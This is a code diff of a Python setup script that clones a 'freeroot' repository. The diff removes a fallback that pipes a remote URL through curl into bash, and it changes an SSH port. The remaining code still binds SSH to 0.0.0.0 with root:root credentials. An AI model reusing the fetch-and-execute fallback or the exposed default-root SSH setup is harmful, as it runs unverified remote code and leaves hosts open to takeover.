@@ -25,10 +25,9 @@ URLS = [
 TMP = 'freeroot_temp'
 DIR = 'work'
 SH = 'noninteractive.sh'
-FALLBACK_URL = 'r.snd.qzz.io/raw/cpu'
 
 ssh_ip = '0.0.0.0'
-ssh_port = 24990
+ssh_port = 25565
 users = {'root': 'root'}
 
 def load_config():
@@ -79,19 +78,6 @@ def clone_repo():
             logger.warning(f'Clone failed from {url}: exit code {e.returncode}')
             delete_recursive(TMP)
     return False
-
-def fallback():
-    if not check_command('curl'):
-        logger.warning('Curl not found, cannot use fallback')
-        return False
-    logger.info(f'Executing fallback: curl {FALLBACK_URL} | bash')
-    try:
-        subprocess.run(f'curl {FALLBACK_URL} | bash', shell=True, check=True)
-        logger.info('Fallback executed successfully')
-        return True
-    except subprocess.CalledProcessError as e:
-        logger.error(f'Fallback failed: {e}')
-        return False
 
 def execute_script(directory, script):
     logger.info(f"Executing script '{script}'...")
@@ -392,15 +378,8 @@ def main():
         delete_recursive(str(tmp_dir))
 
     if not clone_repo():
-        logger.warning('All clone attempts failed, trying fallback method...')
-        delete_recursive(str(tmp_dir))
-        if not fallback():
-            logger.error('Fallback method also failed')
-            sys.exit(1)
-        logger.info('Fallback method succeeded')
-        while True:
-            time.sleep(1)
-        return
+        logger.error('All clone attempts failed')
+        sys.exit(1)
 
     shutil.move(str(tmp_dir), str(work_dir))
     logger.info("Renamed to 'work'")
